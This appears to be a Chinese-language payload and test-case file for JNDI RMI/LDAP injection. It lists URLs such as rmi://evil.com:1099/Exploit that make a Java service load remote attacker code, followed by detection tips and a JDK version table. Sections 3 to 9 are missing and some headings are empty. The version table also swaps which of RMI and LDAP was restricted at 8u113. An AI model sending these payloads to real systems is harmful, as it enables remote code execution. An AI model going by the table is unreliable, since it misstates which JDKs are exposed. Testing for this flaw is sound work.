# JNDI 注入漏洞测试用例
# 漏洞类型: JNDI RMI/LDAP 远程代码加载
# 危险等级: 高危 (High)

# ============================================
# 1. JNDI RMI 注入 - 基础测试
# ============================================
# 端点: /jndi/rmi/vuln?url={payload}

# 基础 RMI 注入
url=rmi://evil.com:1099/Exploit

# 使用 IP 地址
url=rmi://192.168.1.100:1099/Exploit
url=rmi://127.0.0.1:1099/Exploit

# 指定不同端口
url=rmi://evil.com:1099/Exploit
url=rmi://evil.com:9999/Exploit

# 不同对象名称
url=rmi://evil.com:1099/RemoteObj
url=rmi://evil.com:1099/evil


# ============================================
# 2. JNDI LDAP 注入 - 基础测试
# ============================================
# 端点: /jndi/ldap/vuln?url={payload}

# 基础 LDAP 注入
url=ldap://evil.com:1389/Exploit

# 使用 IP 地址
url=ldap://192.168.1.100:1389/Exploit
url=ldap://127.0.0.1:1389/Exploit

# 指定不同端口

# 不同 DN 格式

url=ldap://evil.com:1389/ou=services,dc=evil,dc=com

# ============================================
# 10. 检测方法
# ============================================

# 方法 1: DNS 外带 (推荐)
# 1. 访问 http://dnslog.cn 获取子域名
# 2. 发送: url=ldap://xxx.dnslog.cn:1389/Exploit
# 3. 在 dnslog.cn 查看是否有 DNS 解析记录

# 方法 2: 延迟检测
# 发送指向不存在服务器的请求
# url=ldap://192.168.1.999:1389/Exploit
# 如果响应明显延迟，说明存在 JNDI 查询

# 方法 3: 使用本地恶意服务器
# 1. 启动 evil_ldap_server.py
# 2. 发送: url=ldap://localhost:1389/Exploit
# 3. 检查服务器是否收到连接

# 方法 4: 错误消息分析
# 如果返回 "NamingException" 且包含目标主机信息，说明存在漏洞


# ============================================
# 11. 受影响的 JDK 版本
# ============================================

# JNDI 远程类加载限制:
# - JDK 6u132 及以下: RMI 和 LDAP 都可远程加载
# - JDK 6u132+: LDAP 被限制，RMI 仍可
# - JDK 7u122 及以下: RMI 和 LDAP 都可远程加载
# - JDK 7u122+: LDAP 被限制，RMI 仍可
# - JDK 8u113 及以下: RMI 和 LDAP 都可远程加载
# - JDK 8u113+: LDAP 被限制，RMI 仍可
# - JDK 8u191+: RMI 和 LDAP 都被限制 (但仍可通过本地 Gadget 绕过)

# 系统属性控制:
# com.sun.jndi.rmi.object.trustURLCodebase=true/false
# com.sun.jndi.ldap.object.trustURLCodebase=true/false
